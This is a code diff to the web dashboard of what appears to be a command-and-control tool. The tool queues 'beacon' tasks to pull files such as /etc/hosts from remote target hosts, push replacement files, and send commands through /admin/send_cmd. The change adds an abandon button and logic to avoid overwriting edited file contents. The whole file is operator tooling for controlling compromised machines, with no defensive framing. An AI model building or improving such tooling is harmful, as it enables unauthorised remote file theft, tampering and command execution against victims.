@@ -262,6 +262,7 @@
                 <input type="text" id="vault-path" class="form-control form-control-sm" placeholder="Full path (e.g. /etc/hosts)" style="width: 300px;">
                 <button class="btn btn-sm btn-outline-custom" onclick="vaultOp('pull')">Pull File</button>
                 <button class="btn btn-sm btn-light" onclick="vaultOp('push')">Push & Replace</button>
+                <button class="btn btn-sm btn-outline-danger" onclick="abandonVaultOperation()">Abandon Operation</button>
             </div>
         </div>
         <div class="row g-2">
@@ -276,6 +277,8 @@
     const vaultState = {
         pendingPullHost: null,
         pendingPullPath: null,
+        editorDirty: false,
+        lastAppliedResultId: null,
     };
 
     function b64ToUtf8(input) {
@@ -349,6 +352,16 @@
         updateDashboard();
     }
 
+    function abandonVaultOperation() {
+        vaultState.pendingPullHost = null;
+        vaultState.pendingPullPath = null;
+        document.getElementById('vault-path').value = '';
+        document.getElementById('vault-editor').value = '';
+        vaultState.editorDirty = false;
+        vaultState.lastAppliedResultId = null;
+        document.getElementById('vault-path').placeholder = 'Full path (e.g. /etc/hosts)';
+    }
+
     async function vaultOp(op) {
         const host = document.getElementById('target-select').value;
         const path = document.getElementById('vault-path').value.trim();
@@ -374,6 +387,7 @@
         if (op === 'pull') {
             vaultState.pendingPullHost = host;
             vaultState.pendingPullPath = path;
+            vaultState.editorDirty = false;
             alert("Pull task queued. Wait for next beacon and file will load automatically.");
         } else {
             alert("Push task queued. File will be replaced on next beacon.");
@@ -453,10 +467,14 @@
                 const hostMatch = !vaultState.pendingPullHost || vaultState.pendingPullHost === result.hostname;
                 const pathDecoded = b64ToUtf8(parts[1]);
                 const pathMatch = !vaultState.pendingPullPath || vaultState.pendingPullPath === pathDecoded;
-                if (hostMatch && pathMatch) {
+                const sameResultAlreadyApplied = vaultState.lastAppliedResultId === result.id;
+
+                if (hostMatch && pathMatch && !vaultState.editorDirty && !sameResultAlreadyApplied) {
                     editor.value = b64ToUtf8(parts[2]);
+                    vaultState.lastAppliedResultId = result.id;
                     vaultState.pendingPullHost = null;
                     vaultState.pendingPullPath = null;
+                    vaultState.editorDirty = false;
                     document.getElementById('vault-path').value = pathDecoded;
                 }
             }
@@ -514,6 +532,10 @@
         const res = await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
         if (res.ok) e.target.reset();
         updateDashboard();
+    });
+
+    document.getElementById('vault-editor').addEventListener('input', () => {
+        vaultState.editorDirty = true;
     });
 
     setInterval(() => { document.getElementById('clock').textContent = new Date().toLocaleTimeString(); }, 1000);
